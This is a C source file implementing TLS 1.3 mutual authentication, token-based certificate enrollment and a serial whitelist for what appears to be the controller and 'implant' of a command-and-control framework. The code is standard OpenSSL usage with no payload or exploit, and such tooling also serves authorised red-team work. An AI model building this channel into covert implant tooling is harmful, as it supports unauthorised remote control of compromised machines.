/*
 * tls.c — BP1 mTLS (TLS 1.3) + BP2 enrollment + BP4 serial whitelist.
 *
 * This is the only translation unit that includes OpenSSL headers.
 * Everything else talks to the network through Conn* from tls.h.
 */

#include "tls.h"
#include "platform.h"   /* must precede openssl on Windows (winsock2.h first) */

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <openssl/x509.h>
#include <openssl/x509v3.h>
#include <openssl/pem.h>
#include <openssl/bio.h>
#include <openssl/bn.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ── Module-level SSL contexts ───────────────────────────────────────── */
static SSL_CTX *g_ctx        = NULL;  /* normal mTLS context              */
static SSL_CTX *g_enroll_ctx = NULL;  /* enrollment (CA-only) context     */

/* ── Helpers ─────────────────────────────────────────────────────────── */

static void tls_fatal(const char *msg)
{
    fprintf(stderr, "[TLS] %s\n", msg);
    ERR_print_errors_fp(stderr);
    exit(1);
}

static void tls_common_init(SSL_CTX *ctx)
{
    /* TLS 1.3 only — mandates ECDHE + AES-GCM authenticated encryption */
    if (SSL_CTX_set_min_proto_version(ctx, TLS1_3_VERSION) != 1)
        tls_fatal("Failed to set min TLS version to 1.3");
    if (SSL_CTX_set_max_proto_version(ctx, TLS1_3_VERSION) != 1)
        tls_fatal("Failed to set max TLS version to 1.3");
}

/* ── Server init (controller) ────────────────────────────────────────── */

void tls_init_server(const char *cert_file,
                     const char *key_file,
                     const char *ca_file)
{
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();

    SSL_CTX *ctx = SSL_CTX_new(TLS_server_method());
    if (!ctx) tls_fatal("SSL_CTX_new (server) failed");

    tls_common_init(ctx);

    /* BP2: allow connections without a client cert (enrollment phase).
     * tls_has_client_cert() distinguishes the two cases after accept(). */
    SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, NULL);

    if (SSL_CTX_load_verify_locations(ctx, ca_file, NULL) != 1)
        tls_fatal("Failed to load CA certificate");

    if (SSL_CTX_use_certificate_chain_file(ctx, cert_file) != 1)
        tls_fatal("Failed to load controller certificate");

    if (SSL_CTX_use_PrivateKey_file(ctx, key_file, SSL_FILETYPE_PEM) != 1)
        tls_fatal("Failed to load controller private key");

    if (SSL_CTX_check_private_key(ctx) != 1)
        tls_fatal("Controller cert/key mismatch");

    g_ctx = ctx;
}

/* ── Client init (implant — loads from in-memory PEM buffers) ─────────── */

void tls_init_client_mem(const char *ca_pem,   int ca_len,
                          const char *cert_pem, int cert_len,
                          const char *key_pem,  int key_len)
{
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();

    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) tls_fatal("SSL_CTX_new (client) failed");

    tls_common_init(ctx);

    /* Verify controller certificate — reject any server not signed by our CA */
    SSL_CTX_set_verify(ctx,
                       SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT,
                       NULL);

    /* Load CA cert into the verify store */
    {
        BIO *bio = BIO_new_mem_buf(ca_pem, ca_len);
        if (!bio) tls_fatal("BIO_new_mem_buf (CA) failed");
        X509 *ca = PEM_read_bio_X509(bio, NULL, NULL, NULL);
        BIO_free(bio);
        if (!ca) tls_fatal("Failed to parse CA certificate from memory");
        X509_STORE_add_cert(SSL_CTX_get_cert_store(ctx), ca);
        X509_free(ca);
    }

    /* Load implant certificate */
    {
        BIO *bio = BIO_new_mem_buf(cert_pem, cert_len);
        if (!bio) tls_fatal("BIO_new_mem_buf (cert) failed");
        X509 *cert = PEM_read_bio_X509(bio, NULL, NULL, NULL);
        BIO_free(bio);
        if (!cert) tls_fatal("Failed to parse implant certificate from memory");
        if (SSL_CTX_use_certificate(ctx, cert) != 1)
            tls_fatal("SSL_CTX_use_certificate failed");
        X509_free(cert);
    }

    /* Load implant private key */
    {
        BIO *bio = BIO_new_mem_buf(key_pem, key_len);
        if (!bio) tls_fatal("BIO_new_mem_buf (key) failed");
        EVP_PKEY *pkey = PEM_read_bio_PrivateKey(bio, NULL, NULL, NULL);
        BIO_free(bio);
        if (!pkey) tls_fatal("Failed to parse implant private key from memory");
        if (SSL_CTX_use_PrivateKey(ctx, pkey) != 1)
            tls_fatal("SSL_CTX_use_PrivateKey failed");
        EVP_PKEY_free(pkey);
    }

    if (SSL_CTX_check_private_key(ctx) != 1)
        tls_fatal("Implant cert/key mismatch");

    g_ctx = ctx;
}

/* ── Per-connection wrap ─────────────────────────────────────────────── */

Conn *tls_server_wrap(int fd)
{
    SSL *ssl = SSL_new(g_ctx);
    if (!ssl) return NULL;

    SSL_set_fd(ssl, fd);

    if (SSL_accept(ssl) != 1) {
        fprintf(stderr, "[TLS] SSL_accept failed\n");
        ERR_print_errors_fp(stderr);
        SSL_free(ssl);
        return NULL;
    }

    Conn *c = malloc(sizeof(Conn));
    if (!c) { SSL_free(ssl); return NULL; }
    c->fd  = fd;
    c->ssl = ssl;
    return c;
}

Conn *tls_client_wrap(int fd)
{
    SSL *ssl = SSL_new(g_ctx);
    if (!ssl) return NULL;

    SSL_set_fd(ssl, fd);

    if (SSL_connect(ssl) != 1) {
        fprintf(stderr, "[TLS] SSL_connect failed\n");
        ERR_print_errors_fp(stderr);
        SSL_free(ssl);
        return NULL;
    }

    Conn *c = malloc(sizeof(Conn));
    if (!c) { SSL_free(ssl); return NULL; }
    c->fd  = fd;
    c->ssl = ssl;
    return c;
}

/* ── BP2: enrollment context (client, CA-only) ───────────────────────── */

void tls_init_client_enroll(const char *ca_pem, int ca_len)
{
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();

    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) tls_fatal("SSL_CTX_new (enroll) failed");

    tls_common_init(ctx);

    /* Verify controller cert; no client cert loaded — enrollment is one-way */
    SSL_CTX_set_verify(ctx,
                       SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT,
                       NULL);

    {
        BIO *bio = BIO_new_mem_buf(ca_pem, ca_len);
        if (!bio) tls_fatal("BIO_new_mem_buf (CA enroll) failed");
        X509 *ca = PEM_read_bio_X509(bio, NULL, NULL, NULL);
        BIO_free(bio);
        if (!ca) tls_fatal("Failed to parse CA certificate for enrollment");
        X509_STORE_add_cert(SSL_CTX_get_cert_store(ctx), ca);
        X509_free(ca);
    }

    g_enroll_ctx = ctx;
}

Conn *tls_client_wrap_enroll(int fd)
{
    SSL *ssl = SSL_new(g_enroll_ctx);
    if (!ssl) return NULL;

    SSL_set_fd(ssl, fd);

    if (SSL_connect(ssl) != 1) {
        fprintf(stderr, "[TLS] SSL_connect (enroll) failed\n");
        ERR_print_errors_fp(stderr);
        SSL_free(ssl);
        return NULL;
    }

    Conn *c = malloc(sizeof(Conn));
    if (!c) { SSL_free(ssl); return NULL; }
    c->fd  = fd;
    c->ssl = ssl;
    return c;
}

int tls_has_client_cert(Conn *c)
{
    SSL  *ssl  = (SSL *)c->ssl;
    X509 *peer = SSL_get_peer_certificate(ssl);
    if (peer) { X509_free(peer); return 1; }
    return 0;
}

/* BP2: generate 2048-bit RSA keypair + CSR with CN=token */
int tls_gen_key_and_csr(const char *token,
                         char **key_pem_out, int *key_len_out,
                         char **csr_pem_out, int *csr_len_out)
{
    /* Generate keypair */
    EVP_PKEY_CTX *pctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, NULL);
    if (!pctx) return 0;
    if (EVP_PKEY_keygen_init(pctx) <= 0)
        { EVP_PKEY_CTX_free(pctx); return 0; }
    if (EVP_PKEY_CTX_set_rsa_keygen_bits(pctx, 2048) <= 0)
        { EVP_PKEY_CTX_free(pctx); return 0; }
    EVP_PKEY *pkey = NULL;
    if (EVP_PKEY_keygen(pctx, &pkey) <= 0)
        { EVP_PKEY_CTX_free(pctx); return 0; }
    EVP_PKEY_CTX_free(pctx);

    /* Build CSR */
    X509_REQ *req = X509_REQ_new();
    if (!req) { EVP_PKEY_free(pkey); return 0; }
    X509_REQ_set_version(req, 0);   /* PKCS#10 version 1 */

    X509_NAME *name = X509_REQ_get_subject_name(req);
    X509_NAME_add_entry_by_txt(name, "CN", MBSTRING_ASC,
                                (const unsigned char *)token, -1, -1, 0);

    X509_REQ_set_pubkey(req, pkey);
    if (X509_REQ_sign(req, pkey, EVP_sha256()) == 0)
        { X509_REQ_free(req); EVP_PKEY_free(pkey); return 0; }

    /* Serialise private key */
    {
        BIO *bio = BIO_new(BIO_s_mem());
        PEM_write_bio_PrivateKey(bio, pkey, NULL, NULL, 0, NULL, NULL);
        BUF_MEM *bptr; BIO_get_mem_ptr(bio, &bptr);
        *key_pem_out = malloc(bptr->length);
        memcpy(*key_pem_out, bptr->data, bptr->length);
        *key_len_out = (int)bptr->length;
        BIO_free(bio);
    }

    /* Serialise CSR */
    {
        BIO *bio = BIO_new(BIO_s_mem());
        PEM_write_bio_X509_REQ(bio, req);
        BUF_MEM *bptr; BIO_get_mem_ptr(bio, &bptr);
        *csr_pem_out = malloc(bptr->length);
        memcpy(*csr_pem_out, bptr->data, bptr->length);
        *csr_len_out = (int)bptr->length;
        BIO_free(bio);
    }

    X509_REQ_free(req);
    EVP_PKEY_free(pkey);
    return 1;
}

/* BP2: sign a CSR — validate token CN, issue 30-day cert, append serial */
int tls_sign_csr(const char *csr_pem,     int csr_len,
                  const char *ca_cert_file,
                  const char *ca_key_file,
                  const char *expected_token,
                  const char *whitelist_path,
                  char **cert_pem_out, int *cert_len_out)
{
    /* Load CA cert */
    FILE *f = fopen(ca_cert_file, "r");
    if (!f) { fprintf(stderr, "[TLS] Cannot open CA cert: %s\n", ca_cert_file); return 0; }
    X509 *ca_cert = PEM_read_X509(f, NULL, NULL, NULL);
    fclose(f);
    if (!ca_cert) { fprintf(stderr, "[TLS] Failed to parse CA cert\n"); return 0; }

    /* Load CA key */
    f = fopen(ca_key_file, "r");
    if (!f) {
        fprintf(stderr, "[TLS] Cannot open CA key: %s\n", ca_key_file);
        X509_free(ca_cert); return 0;
    }
    EVP_PKEY *ca_key = PEM_read_PrivateKey(f, NULL, NULL, NULL);
    fclose(f);
    if (!ca_key) {
        fprintf(stderr, "[TLS] Failed to parse CA key\n");
        X509_free(ca_cert); return 0;
    }

    /* Parse CSR */
    BIO *bio = BIO_new_mem_buf(csr_pem, csr_len);
    X509_REQ *req = PEM_read_bio_X509_REQ(bio, NULL, NULL, NULL);
    BIO_free(bio);
    if (!req) {
        fprintf(stderr, "[TLS] Failed to parse CSR\n");
        EVP_PKEY_free(ca_key); X509_free(ca_cert); return 0;
    }

    /* Verify CSR self-signature */
    EVP_PKEY *req_pubkey = X509_REQ_get_pubkey(req);
    if (!req_pubkey || X509_REQ_verify(req, req_pubkey) <= 0) {
        fprintf(stderr, "[TLS] CSR signature verification failed\n");
        if (req_pubkey) EVP_PKEY_free(req_pubkey);
        X509_REQ_free(req); EVP_PKEY_free(ca_key); X509_free(ca_cert);
        return 0;
    }

    /* Extract CN and validate against enrollment token */
    X509_NAME *subj = X509_REQ_get_subject_name(req);
    int idx = X509_NAME_get_index_by_NID(subj, NID_commonName, -1);
    if (idx < 0) {
        fprintf(stderr, "[TLS] CSR has no CN\n");
        EVP_PKEY_free(req_pubkey);
        X509_REQ_free(req); EVP_PKEY_free(ca_key); X509_free(ca_cert);
        return 0;
    }
    X509_NAME_ENTRY *entry = X509_NAME_get_entry(subj, idx);
    ASN1_STRING     *data  = X509_NAME_ENTRY_get_data(entry);
    const char      *cn    = (const char *)ASN1_STRING_get0_data(data);
    if (!expected_token || strcmp(cn, expected_token) != 0) {
        fprintf(stderr, "[TLS] Enrollment token mismatch\n");
        EVP_PKEY_free(req_pubkey);
        X509_REQ_free(req); EVP_PKEY_free(ca_key); X509_free(ca_cert);
        return 0;
    }

    /* Build the signed certificate */
    X509 *cert = X509_new();
    if (!cert) {
        EVP_PKEY_free(req_pubkey);
        X509_REQ_free(req); EVP_PKEY_free(ca_key); X509_free(ca_cert);
        return 0;
    }

    X509_set_version(cert, 2);  /* X.509 v3 */

    /* Random 64-bit serial */
    BIGNUM *bn = BN_new();
    BN_rand(bn, 64, BN_RAND_TOP_ANY, BN_RAND_BOTTOM_ANY);
    ASN1_INTEGER *serial_asn1 = BN_to_ASN1_INTEGER(bn, NULL);
    X509_set_serialNumber(cert, serial_asn1);
    ASN1_INTEGER_free(serial_asn1);

    /* 30-day validity */
    X509_gmtime_adj(X509_getm_notBefore(cert), 0);
    X509_gmtime_adj(X509_getm_notAfter(cert),  30L * 24 * 3600);

    /* Subject from CSR, issuer from CA */
    X509_set_subject_name(cert, X509_REQ_get_subject_name(req));
    X509_set_issuer_name(cert, X509_get_subject_name(ca_cert));

    /* Public key from CSR */
    X509_set_pubkey(cert, req_pubkey);
    EVP_PKEY_free(req_pubkey);

    /* Sign with CA key */
    if (X509_sign(cert, ca_key, EVP_sha256()) == 0) {
        fprintf(stderr, "[TLS] X509_sign failed\n");
        X509_free(cert);
        X509_REQ_free(req); EVP_PKEY_free(ca_key); X509_free(ca_cert);
        BN_free(bn);
        return 0;
    }

    /* Append serial (hex) to whitelist */
    if (whitelist_path) {
        char *hex = BN_bn2hex(bn);
        FILE *wl = fopen(whitelist_path, "a");
        if (wl) { fprintf(wl, "%s\n", hex); fclose(wl); }
        OPENSSL_free(hex);
    }
    BN_free(bn);

    /* Serialise cert to PEM */
    BIO *out = BIO_new(BIO_s_mem());
    PEM_write_bio_X509(out, cert);
    BUF_MEM *bptr; BIO_get_mem_ptr(out, &bptr);
    *cert_pem_out = malloc(bptr->length);
    memcpy(*cert_pem_out, bptr->data, bptr->length);
    *cert_len_out = (int)bptr->length;
    BIO_free(out);

    X509_free(cert);
    X509_REQ_free(req);
    EVP_PKEY_free(ca_key);
    X509_free(ca_cert);
    return 1;
}

/* BP2: verify a cert PEM was signed by the given CA PEM.
 * Used by the implant to detect PKI rotation before trusting stored creds. */
int tls_cert_signed_by_ca(const char *cert_pem, int cert_len,
                            const char *ca_pem,   int ca_len)
{
    BIO *bio = BIO_new_mem_buf(cert_pem, cert_len);
    X509 *cert = PEM_read_bio_X509(bio, NULL, NULL, NULL);
    BIO_free(bio);
    if (!cert) return 0;

    bio = BIO_new_mem_buf(ca_pem, ca_len);
    X509 *ca = PEM_read_bio_X509(bio, NULL, NULL, NULL);
    BIO_free(bio);
    if (!ca) { X509_free(cert); return 0; }

    X509_STORE     *store = X509_STORE_new();
    X509_STORE_add_cert(store, ca);
    X509_STORE_CTX *ctx   = X509_STORE_CTX_new();
    X509_STORE_CTX_init(ctx, store, cert, NULL);

    int ok = (X509_verify_cert(ctx) == 1);

    X509_STORE_CTX_free(ctx);
    X509_STORE_free(store);
    X509_free(cert);
    X509_free(ca);
    return ok;
}

/* ── BP4: serial whitelist ────────────────────────────────────────────── */

int tls_whitelist_check(Conn *c, const char *whitelist_path)
{
    if (whitelist_path == NULL)
        return 1; /* no whitelist configured — accept all valid mTLS connections */

    SSL  *ssl  = (SSL *)c->ssl;
    X509 *peer = SSL_get_peer_certificate(ssl);
    if (!peer) {
        fprintf(stderr, "[TLS] No peer certificate after handshake\n");
        return 0;
    }

    /* Hex-encode the serial number for line-by-line comparison */
    ASN1_INTEGER *serial_asn1 = X509_get_serialNumber(peer);
    BIGNUM       *serial_bn   = ASN1_INTEGER_to_BN(serial_asn1, NULL);
    char         *serial_hex  = BN_bn2hex(serial_bn);
    BN_free(serial_bn);
    X509_free(peer);

    FILE *fp = fopen(whitelist_path, "r");
    if (!fp) {
        fprintf(stderr, "[TLS] Cannot open whitelist: %s — rejecting\n",
                whitelist_path);
        OPENSSL_free(serial_hex);
        return 0;
    }

    int  found = 0;
    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        /* Strip trailing newline/CR */
        line[strcspn(line, "\r\n")] = '\0';
        if (*line == '#' || *line == '\0') continue; /* skip comments/blanks */
        if (strcasecmp(line, serial_hex) == 0) {
            found = 1;
            break;
        }
    }
    fclose(fp);

    if (!found)
        fprintf(stderr, "[TLS] Serial %s not in whitelist — rejecting\n",
                serial_hex);

    OPENSSL_free(serial_hex);
    return found;
}

/* ── Teardown ────────────────────────────────────────────────────────── */

void tls_conn_free(Conn *c)
{
    if (!c) return;
    if (c->ssl) {
        SSL_shutdown((SSL *)c->ssl);
        SSL_free((SSL *)c->ssl);
    }
    CLOSE_SOCKET(c->fd);
    free(c);
}

void tls_cleanup(void)
{
    if (g_ctx) {
        SSL_CTX_free(g_ctx);
        g_ctx = NULL;
    }
    if (g_enroll_ctx) {
        SSL_CTX_free(g_enroll_ctx);
        g_enroll_ctx = NULL;
    }
}
